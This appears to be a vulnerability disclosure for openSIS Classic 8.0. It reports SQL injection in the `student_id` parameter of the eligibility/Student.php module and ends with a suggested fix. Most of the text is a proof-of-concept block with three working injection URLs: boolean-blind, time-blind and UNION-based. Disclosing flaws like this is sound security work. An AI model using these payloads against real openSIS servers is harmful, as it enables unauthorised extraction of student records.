| Due to lack of protection, parameter `student_id` in /modules/eligibility/Student.php can be abused to injection SQL queries to extract information from databases. **POC:** ``` Type: boolean-based blind Title: Boolean-based blind - Parameter replace (original value) Payload: /openSIS-Classic-8.0/Ajax.php?modname=eligibility/Student.php&student_id=(SELECT (CASE WHEN (5146=5146) THEN 15 ELSE (SELECT 5608 UNION SELECT 5507) END))&ajax=true  Type: time-based blind Title: MySQL < 5.0.12 AND time-based blind (heavy query) Payload: /openSIS-Classic-8.0/Ajax.php?modname=eligibility/Student.php&student_id=15 AND 2719=BENCHMARK(5000000,MD5(0x5246526f))&ajax=true  Type: UNION query Title: Generic UNION query (NULL) - 5 columns Payload: /openSIS-Classic-8.0/Ajax.php?modname=eligibility/Student.php&student_id=15 UNION ALL SELECT NULL,NULL,CONCAT(0x716b706271,0x6b67466d72447a6e53786a6d4c527a71657250527871584356544f484c4a417a494c48637847576d,0x7170786b71),NULL,NULL-- -&ajax=true  ```  ---   [PIC](https://user-images.githubusercontent.com/101056689/157055316-311cc197-1f86-4376-b96e-58fc680d097b.png) **Traceback:** openSIS-Classic-8.0/modules/eligibility/Student.php **Solution:** Use function sqlSecurityFilter() before assign $\_REQUEST['student\_id'] into query "SELECT".
